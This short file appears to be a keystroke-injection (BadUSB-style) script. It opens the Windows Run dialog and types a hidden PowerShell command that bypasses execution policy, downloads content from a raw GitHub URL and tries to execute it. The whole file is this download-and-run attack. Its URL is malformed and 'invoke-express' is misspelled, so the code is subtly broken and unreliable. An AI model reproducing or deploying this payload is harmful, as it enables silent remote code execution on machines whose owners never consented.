var GITHUB = "https://raw.githubusercontentcom?dl=1";

layout('us');
press("GUI r");
type("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr "+ GITHUB + "; invoke-express $pl");
delay(500);
press("ENTER");
